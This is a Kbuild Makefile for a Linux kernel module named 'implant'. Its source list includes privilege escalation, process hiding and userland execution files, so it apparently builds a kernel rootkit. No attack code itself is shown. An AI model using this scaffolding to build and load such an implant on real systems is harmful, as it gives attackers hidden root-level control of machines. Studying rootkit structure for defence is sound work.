MODNAME ?= implant

ccflags-y := -I$(src)/kmod/include

ifneq ($(IMPLANT_DEVICE_NAME),)
ccflags-y += -DIMPLANT_DEVICE_NAME=$(IMPLANT_DEVICE_NAME)
endif

ifneq ($(IMPLANT_CLASS_NAME),)
ccflags-y += -DIMPLANT_CLASS_NAME=$(IMPLANT_CLASS_NAME)
endif

ifneq ($(IMLOG_LEVEL),)
ccflags-y += -DIMLOG_LEVEL=$(IMLOG_LEVEL)
endif

obj-m := $(MODNAME).o

# add c files
SRCS += kmod/src/implant.c
SRCS += kmod/src/privilege_escalation.c
SRCS += kmod/src/hide_proc.c
SRCS += kmod/src/commands.c
SRCS += kmod/src/ketopt.c
SRCS += kmod/src/userland_exec.c

OBJS := $(SRCS:.c=.o)

$(MODNAME)-y := $(OBJS)
